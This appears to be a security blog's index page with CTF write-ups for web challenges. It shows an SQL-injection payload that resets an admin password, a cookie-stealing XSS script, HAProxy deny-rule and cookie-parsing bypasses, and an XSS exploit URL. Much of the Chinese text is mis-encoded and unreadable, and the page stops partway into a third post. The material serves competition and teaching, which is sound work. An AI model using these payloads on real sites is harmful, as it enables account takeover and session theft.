<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.plasf.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
<meta name="keywords" content="CTF|ç½‘ç»œå®‰å…¨|å¼€å‘">
<meta property="og:type" content="website">
<meta property="og:title" content="Xiao Leung&#39;s Blog">
<meta property="og:url" content="https://www.plasf.cn/page/3/index.html">
<meta property="og:site_name" content="Xiao Leung&#39;s Blog">
<meta property="og:description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Xiao Leung&#39;s Blog">
<meta name="twitter:description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">

<link rel="canonical" href="https://www.plasf.cn/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Xiao Leung's Blog</title>
  


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?9905f6cfc84bbdd051e0d6a5e5f8714a";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Xiao Leung's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">ä¸“æ³¨ç½‘ç»œå®‰å…¨ç ”ç©¶</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>ç«™ç‚¹åœ°å›¾</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d6b507308d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d6b507308d.html" class="post-title-link" itemprop="url">TG-hack CTF Write Up</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-04-12 15:34:45" itemprop="dateCreated datePublished" datetime="2020-04-12T15:34:45+08:00">2020-04-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:12:31" itemprop="dateModified" datetime="2020-10-14T17:12:31+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>1.7k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>2 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Tghack-CTF-WP"><a href="#Tghack-CTF-WP" class="headerlink" title="Tghack CTF WP"></a>Tghack CTF WP</h1><h2 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h2><blockquote>
<p>Author: <a href="https://tghack.no/authors#12" target="_blank" rel="noopener"><strong>Nora - Norasaurus#8234</strong></a></p>
<p>Here is your Gaia form to get your weekly plant rations. Complete the form and reap your reward!</p>
<p><a href="https://redux.tghack.no/" target="_blank" rel="noopener">redux.tghack.no</a></p>
</blockquote>
<p>FLAG in a JavaScript File.</p>
<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><blockquote>
<p>Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
<p>We found the Mother cult merch store. In addition to selling clothing items they sell some secrets we need. For the time being we havenâ€™t been able to secure the funds necessary to do so. Can you help us?</p>
<ul>
<li><a href="https://shop.tghack.no/" target="_blank" rel="noopener">shop.tghack.no</a></li>
</ul>
</blockquote>
<p>O-M-G,I regret it very much.ğŸ˜‚My friends and I were still discussing last night  about it might have changed the price to negative. I found it could be bought when the id undefined. But I forgot to check it when price to negative.</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866692758656.png" alt="img"></p>
<p>We use burp suite to packet capture and change the price to negative .It is very important to change the id to undefined.</p>
<p>e g:</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866688491552.png" alt="img"></p>
<p>And then,it happened that is amazing!We have more money!</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866691878335.png" alt="img"></p>
<p>OKï¼Œwe can buy the flagâ€¦.</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866692306869.png" alt="img"></p>
<h2 id="Bobby"><a href="#Bobby" class="headerlink" title="Bobby"></a>Bobby</h2><blockquote>
<p> Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
<p>Little bobby forgot his password. Can you help him log in?</p>
<p><a href="https://bobby.tghack.no/" target="_blank" rel="noopener">bobby.tghack.no</a></p>
</blockquote>
<p>I didnâ€™t find any bugs in this container at 1stğŸ˜­.After a long time,My classmate told me ,it has an SQL injection in the new password param when you change the pass.</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866718226965.png" alt="img"></p>
<p>We can know that itâ€™s a update sql and we can control a  param .</p>
<p>eg:</p>
<blockquote>
<p>update table set column=â€™paramâ€™ where â€¦â€¦</p>
</blockquote>
<p>1st,I want to commented out â€œwhereâ€œ and I write payload like the following . But it can â€˜t change passwd and throw me an errorâ€¦..</p>
<pre><code>admin&#39;-- &#39; WHERE user=? AND pass=?</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866726963625.png" alt="img"></p>
<p>From here we should bind 2 params to this sql.So we change this payload like this:</p>
<pre><code>admin&#39;,user=? , pass=? -- </code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866730992987.png" alt="img"></p>
<p>And then , we changed this adminâ€™s pass,we can get flag, when we login.</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866731884985.png" alt="img"></p>
<h2 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h2><blockquote>
<p>Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
<p>We have found a forum used by members of the Mother cult. The members are sitting behind an advanced firewall without access to the internet. We need their super secret information.</p>
<p><a href="https://exfiltration.tghack.no/" target="_blank" rel="noopener">exfiltration.tghack.no</a></p>
</blockquote>
<pre><code class="javascript">&lt;script&gt;
let xhr = new XMLHttpRequest();
xhr.open(&quot;post&quot;, window.location.href, true);
xhr.send(document.cookie);
&lt;/script&gt;</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d497e0f4e8.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d497e0f4e8.html" class="post-title-link" itemprop="url">Midnight SUN CTF 2020  Write up</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-04-07 14:49:35" itemprop="dateCreated datePublished" datetime="2020-04-07T14:49:35+08:00">2020-04-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:14:16" itemprop="dateModified" datetime="2020-10-14T17:14:16+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>3.9k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>4 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="harproxy"><a href="#harproxy" class="headerlink" title="harproxy"></a>harproxy</h2><p>é¢˜ç›®ä¸€å¼€å§‹å°±ç»™å‡ºäº†<code>harproxy</code>çš„é…ç½®æ–‡ä»¶ï¼š</p>
<pre><code>global
  daemon
  log 127.0.0.1 local0 debug

defaults
  log               global
  retries           3
  maxconn           2000
  timeout connect   5s
  timeout client    50s
  timeout server    50s

resolvers docker_resolver
  nameserver dns 127.0.0.11:53

frontend internal_access
  bind 127.0.0.1:8080
  mode http
  use_backend test

frontend internet_access
  bind *:80
  errorfile 403 /etc/haproxy/errorfiles/403custom.http
  http-response set-header Server Server
  http-request deny if METH_POST
  http-request deny if { path_beg /admin }
  http-request deny if { cook(IMPERSONATE) -m found }
  http-request deny if { hdr_len(Cookie) gt 69 }
  mode http
  use_backend test

backend test
  balance roundrobin
  mode http
  server flaskapp app:8282 resolvers docker_resolver resolve-prefer ipv4
</code></pre><h3 id="harproxyé…ç½®"><a href="#harproxyé…ç½®" class="headerlink" title="harproxyé…ç½®"></a>harproxyé…ç½®</h3><p>å¯ä»¥çœ‹åˆ°æœ‰å››ä¸ªæ ¸å¿ƒçš„è®¾ç½®ï¼š</p>
<pre><code>  http-request deny if { path_beg /admin }
  http-request deny if { cook(IMPERSONATE) -m found }
  http-request deny if { hdr_len(Cookie) gt 69 }
  .........
  server flaskapp app:8282 resolvers docker_resolver resolve-prefer ipv4</code></pre><ul>
<li>æ‹’ç»urlè·¯å¾„ä¸º/adminå¼€å¤´</li>
<li>æ‹’ç»cookieä¸æ˜¯IMPERSONATEå¼€å¤´</li>
<li>æ‹’ç»é•¿åº¦å¤§äº69çš„cookie</li>
<li>è¿™æ˜¯ä¸€ä¸ªflaskåº”ç”¨</li>
</ul>
<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><ul>
<li>bypass<code>http-request deny if { path_beg /admin }</code>ç›´æ¥ä½¿ç”¨ç”¨<code>//admin</code>è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯åœ¨æµ‹è¯•ä¸­å‘ç°GETæ–¹å¼ä»ç„¶ä¸è¡Œï¼Œæœ€ååœ¨å…¶ä»–å¤§ä½¬çš„wpä¸­çœ‹åˆ°ä½¿ç”¨çš„æ˜¯HEADè¿›è¡Œå‘é€ã€‚æœ€åä¼šå‡ºæ¥cookie:</li>
</ul>
<p><img src="https://cdn.redmango.top/img/20200405214255.png" alt="img"></p>
<ul>
<li>ä¼ è¾“cookiesæ—¶å€™è¿˜æœ‰ä¸ªå°trickï¼Œ<code>http1.1</code>æ˜¯å…è®¸cookieåˆ†æ®µä¼ è¾“çš„æ‰€ä»¥</li>
</ul>
<pre><code>Cookie: KEY=0be40039bcd8286eab237f481641b16e5e3ab442e0bc1135f08c143b22dc1efc;
Cookie: IMPERSONATE=admin</code></pre><ul>
<li>ä½†æ˜¯ä¼ å…¥æ­£åˆ™åä»ç„¶æ— æ³•getflag</li>
</ul>
<p><img src="https://cdn.redmango.top/img/20200405214602.png" alt="img"></p>
<ul>
<li>è¿™é‡Œå°±å’Œflaskå’Œhaproxyè§£æcookiesçš„ç»“æœä¸ä¸€æ ·å¯¼è‡´bypass.çœ‹wpæ˜¯ä½¿ç”¨è¿›è¡Œç»•è¿‡</li>
</ul>
<blockquote>
<pre><code>;=IMPERSONATE=admin</code></pre></blockquote>
<ul>
<li>æˆ‘ä»¬ç›´æ¥çœ‹flaskçš„requestçš„cookieæ–¹æ³•ï¼š</li>
</ul>
<pre><code class="python">_cookie_re = re.compile(
    br&quot;&quot;&quot;
    (?P&lt;key&gt;[^=;]+)
    (?:\s*=\s*
        (?P&lt;val&gt;
            &quot;(?:[^\\&quot;]|\\.)*&quot; |
             (?:.*?)
        )
    )?
    \s*;
&quot;&quot;&quot;,
    flags=re.VERBOSE,
)</code></pre>
<ul>
<li>æˆ‘ä»¬ä¼ å…¥<code>;=IMPERSONATE=admin</code>å‘ç°cookieç›´æ¥è¢«è§£æäº†ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200407/15862420918417.png" alt="img"></p>
<h2 id="Crossintheroof"><a href="#Crossintheroof" class="headerlink" title="Crossintheroof"></a>Crossintheroof</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><pre><code class="php+HTML">&lt;?php
 header(&#39;X-XSS-Protection: 0&#39;);
 header(&#39;X-Frame-Options: deny&#39;);
 header(&#39;X-Content-Type-Options: nosniff&#39;);
 header(&#39;Content-Type: text/html; charset=UTF-8&#39;);

if(!isset($_GET[&#39;xss&#39;])){
    if(isset($_GET[&#39;error&#39;])){
        die(&#39;stop haking me!!!&#39;);
    }

    if(isset($_GET[&#39;source&#39;])){
        highlight_file(&#39;index.php&#39;);
        die();
    }

    die(&#39;unluky&#39;);
}

 $xss = $_GET[&#39;xss&#39;]?$_GET[&#39;xss&#39;]:&quot;&quot;;
 $xss = preg_replace(&quot;|[}/{]|&quot;, &quot;&quot;, $xss);

?&gt;
&lt;script&gt;
setTimeout(function(){
    try{
        return location = &#39;/?i_said_no_xss_4_u_:)&#39;;
        nodice=&lt;?php echo $xss; ?&gt;;
    }catch(err){
        return location = &#39;/?error=&#39;+&lt;?php echo $xss; ?&gt;;
    }
    },500);
&lt;/script&gt;
&lt;script&gt;
/* 
    payload: &lt;?php echo $xss ?&gt;

*/
&lt;/script&gt;
&lt;body onload=&#39;location=&quot;/?no_xss_4_u_:)&quot;&#39;&gt;hi. bye.&lt;/body&gt;</code></pre>
<h3 id="æš‚å­˜æ­»åŒº"><a href="#æš‚å­˜æ­»åŒº" class="headerlink" title="æš‚å­˜æ­»åŒº"></a>æš‚å­˜æ­»åŒº</h3><ul>
<li><p><code>&lt;!-- &lt;srcpit&gt;</code></p>
</li>
<li><p>è¿™åœ¨<a href="https://html.spec.whatwg.org/multipage/scripting.html#restrictions-for-contents-of-script-elements" target="_blank" rel="noopener">HTML</a>æ ‡å‡†ä¸­æœ‰æåŠ</p>
</li>
</ul>
<pre><code class="html">&lt;script&gt;
    var example = &#39;Consider this string: &lt;!-- &lt;script&gt;&#39;;
    console.log(example);
  &lt;/script&gt;
&lt;body&gt;hi. bye.&lt;/body&gt;</code></pre>
<ul>
<li>åœ¨jsä»£ç ä¸­åŠ å…¥<code>&lt;!-- &lt;srcpit&gt;</code>ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Œå¯ä»¥è§‚å¯Ÿåˆ°,<code>&lt;body&gt;</code>è¢«å½“åšjsä»£ç å¹¶å…¥ä¸Šä¸€çº§çš„<code>&lt;srcpit&gt;</code>æ ‡ç­¾ä¸­ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200407/158624379728.png" alt="img"></p>
<ul>
<li>å›åˆ°ä¸Šé¢é¢˜ç›®ï¼š<pre><code class="html">&lt;script&gt;
setTimeout(function(){
  try{
      return location = &#39;/?i_said_no_xss_4_u_:)&#39;;
      nodice=&lt;?php echo $xss; ?&gt;;
  }catch(err){
      return location = &#39;/?error=&#39;+&lt;?php echo $xss; ?&gt;;
  }
  },500);
&lt;/script&gt;
&lt;script&gt;
/* 
  payload: &lt;?php echo $xss ?&gt;
</code></pre>
</li>
</ul>
<p>*/<br></p>
<body onload="location="/?no_xss_4_u_:)"">hi. bye.<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
```

<ul>
<li>æˆ‘ä»¬è¦ç›´æ¥bypassæœ€åçš„é‚£ä¸ª<code>&lt;body&gt;</code>å°±å¯ä»¥åœ¨$xssä¸­ä¼ å…¥ä¸€ä¸ª<code>&lt;!-- &lt;srcpit&gt;</code></li>
<li>é‚£ä¹ˆå¦‚ä½•è¾“å‡ºæ„é€ xssè¿™é‡Œï¼Ÿ</li>
<li>è¿™é‡Œç¬¬ä¸€ä¸ªreturnè‚¯å®šæ˜¯ä¸èƒ½è®©ä»–æ‰§è¡Œçš„ï¼Œå¦åˆ™ä»–å°±ä¼šç›´æ¥è·³è½¬ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€æ®µä»£ç ã€‚</li>
</ul>
<pre><code class="javascript">function foo() {
    try{
        return x = &#39;x&#39;;
        let x=1;

    }catch(err){
        return alert(1);
    }}
foo();</code></pre>
<ul>
<li>æ‰§è¡Œä¼šå‘ç°å¼¹æ¡†ã€‚è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Œå‰é¢æˆ‘ä»¬è¯´è¿‡letå’Œvarçš„åŒºåˆ«ï¼Œæ­£å› ä¸ºletä¸èƒ½è®¾ç½®å·²ç»å£°æ˜è¿‡çš„å˜é‡å¯¼è‡´<code>try</code>ä¸­å‡ºé”™ï¼Œè·³è½¬åˆ°<code>catch(err)</code>ä¸­æ‰§è¡Œäº†<code>alert</code>,ä½†æ˜¯ä¸ºä»€ä¹ˆç¬¬ä¸€ä¸ªreturnæ²¡æœ‰è¢«æ‰§è¡Œè·³è½¬å‘¢ï¼Ÿ</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200407/15862463309057.png" alt="img"></p>
<ul>
<li>éš¾é“æ˜¯å› ä¸ºåªè¦åœ¨ä»£ç å—ä¸­å‡ºç°é”™è¯¯å°±ä¼šè·³è½¬åˆ°<code>catch(err)</code>ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠä»£ç æ”¹æˆ</li>
</ul>
<pre><code class="javascript">function foo() {
    try{
        return x = &#39;x&#39;;
        print(s);

    }catch(err){
        return alert(1);
    }}
foo();</code></pre>
<ul>
<li>å¯ä»¥çœ‹åˆ°è¿™æ¬¡ç›´æ¥è¿”å›äº†x,å¹¶æ²¡æœ‰æ‰§è¡Œ<code>catch(err)</code>å†…å®¹ã€‚å¯ä»¥çŒœæµ‹è¿™ä¸ªå’Œ<code>let</code>æœ‰å…³ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200407/15862469661040.png" alt="img"></p>
<ul>
<li>æˆ‘ä»¬å†æŠŠ<code>let</code>æ¢æˆ<code>const</code>å‘¢ï¼Ÿå¯ä»¥å‘ç°<code>alert</code>è¢«æ‰§è¡Œäº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŸ¥é“<code>let</code>å’Œ<code>const</code>æœ‰ä¸€ä¸ªå…±åŒçš„ç‰¹ç‚¹é‚£å°±æ˜¯<code>æš‚å­˜æ­»åŒº</code>,å› ä¸ºletå£°æ˜ä¸ä¼šè¢«æå‡åˆ°å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡çš„é¡¶éƒ¨ã€‚è¯¥å˜é‡å±äºä»å—å¼€å§‹åˆ°åˆå§‹åŒ–å¤„ç†çš„â€œæš‚å­˜æ­»åŒºâ€ã€‚ä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸€ä¸ª<code>return</code>åˆ°<code>let</code>ä¹‹é—´éƒ½æ˜¯æš‚å­˜æ­»åŒºã€‚åœ¨ç¨‹åºçš„æ§åˆ¶æµç¨‹åœ¨æ–°çš„ä½œç”¨åŸŸè¿›è¡Œå®ä¾‹åŒ–æ—¶ï¼Œåœ¨æ­¤ä½œç”¨åŸŸä¸­ç”¨letã€constå£°æ˜çš„å˜é‡ä¼šåœ¨è¯¥ä½œç”¨åŸŸä¸­å…ˆåˆ›å»ºï¼Œä½†è¿™ä¸ªæ—¶å€™è¿˜æ²¡æœ‰è¿›è¡Œè¯æ³•ç»‘å®šï¼Œæ²¡æœ‰è¿›è¡Œå¯¹å£°æ˜è¯­å¥çš„æ±‚å€¼è¿ç®—ï¼Œæ‰€ä»¥æ˜¯ä¸èƒ½è®¿é—®çš„ï¼Œè®¿é—®ä¼šæŠ›å‡ºé”™è¯¯ã€‚æ‰€ä»¥letå¯ä»¥ç®€å•ç†è§£ä¸ºæœ€å…ˆæ‰§è¡Œï¼Œä½†æ˜¯æ²¡æœ‰å°†å…¶ä¸å˜é‡ç»‘å®šï¼Œæ‰€ä»¥åé¢returnè®¿é—®æ—¶å€™å°±æŠ›å‡ºäº†é”™è¯¯ï¼Œå¯¼è‡´äº†catchè¢«æ‰§è¡Œã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200407/15862475313345.png" alt="img"></p>
<ul>
<li>åœ¨mozillaå°±æœ‰è¿™ä¹ˆä¸€ä¸ªä¾‹å­ï¼ˆ<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/let" target="_blank" rel="noopener">ç›´é€šè½¦</a>ï¼‰ï¼Œæ‰€ä»¥å¯¼è‡´xssè¢«æ‰§è¡Œã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200409/15863628386804.png" alt="img"></p>
<h3 id="exp-ç»¼ä¸Šæ‰€è¿°"><a href="#exp-ç»¼ä¸Šæ‰€è¿°" class="headerlink" title="exp ç»¼ä¸Šæ‰€è¿°"></a>exp ç»¼ä¸Šæ‰€è¿°</h3><pre><code class="http">http://127.0.0.1/xss.php?xss=alert(1);let%20location=1;%0a%3C!--%3Cscript</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d7163af6f6.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d7163af6f6.html" class="post-title-link" itemprop="url">å†…éƒ¨äº¤æµå°æ¯”èµ›</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-04-01 19:24:06" itemprop="dateCreated datePublished" datetime="2020-04-01T19:24:06+08:00">2020-04-01</time>
            </span>
              <span class="post-meta-item">
